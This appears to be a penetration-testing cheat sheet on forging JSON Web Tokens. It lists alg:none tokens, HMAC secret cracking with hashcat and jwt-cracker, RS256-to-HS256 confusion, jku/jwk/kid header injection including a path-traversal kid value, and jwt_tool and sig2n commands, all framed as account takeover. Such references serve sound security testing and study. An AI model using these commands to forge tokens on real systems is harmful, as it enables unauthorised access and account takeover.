---
tags:
  - Web
---

# :material-key-chain-variant: JWT Attacks

<span class="pill pill-hard">token forgery</span> <span class="pill pill-info">web</span>

JSON Web Tokens are self-contained auth. If signature verification is weak or optional, you forge claims (`admin: true`, another `sub`) and become anyone.

!!! abstract "TL;DR"
    Decode `header.payload.signature`. Attack the *verification*: unsigned acceptance, crackable secrets, algorithm confusion, and header-injection tricks.

## :material-format-list-bulleted: Core attacks

=== "alg: none"

    ```json
    {"alg":"none","typ":"JWT"}
    ```
    Strip the signature; some libs accept an unsigned token.

=== "Weak HMAC secret"

    ```bash
    hashcat -m 16500 jwt.txt rockyou.txt
    ```
    Crack it, then re-sign forged claims.

=== "RS256 → HS256 confusion"

    Server verifies RS256 with a public key. Force `alg:HS256` and sign with the **public key** as the HMAC secret — you already know it.

## :material-file-search: Header injection tricks

- **`jku` / `x5u`** — point at your own JWKS/cert URL if the host isn't validated.
- **`jwk`** — embed your own public key in the header (self-signed).
- **`kid`** — path traversal (`kid: ../../dev/null`) or SQLi to control the key.

## :material-tools: jwt_tool

```bash
python3 jwt_tool.py <token> -M at            # run all attacks
python3 jwt_tool.py <token> -X a             # alg:none
python3 jwt_tool.py <token> -C -d rockyou.txt  # crack HMAC
```

!!! loot "What forgery buys you"
    A forged token = instant privilege escalation and account takeover with no password. Check `role`, `isAdmin`, `sub`, `scope` claims.

## :material-key-variant: Cracking the HMAC secret

```bash
# jwt-cracker — brute the symmetric key by alphabet + max length, or dictionary
jwt-cracker -t <token> -a abcdefghijklmnopqrstuvwxyz --max 6
jwt-cracker -t <token> -d rockyou.txt
```

## :material-key-plus: Recover the public key from two tokens

When RS256→HS256 confusion needs the server's public key but you don't have it, derive
a *usable* key from **two** captured tokens with PortSwigger's `sig2n`, then re-sign
forged claims with each candidate:

```bash
docker run --rm -it portswigger/sig2n <token1> <token2>
```

## :material-link-variant: Related

- A deeper dive on the JWT section of [Auth Bypass](auth-bypass.md).
- Pairs with [OAuth & SAML](oauth-saml.md) flows.
- Reference: [PortSwigger JWT](https://portswigger.net/web-security/jwt).
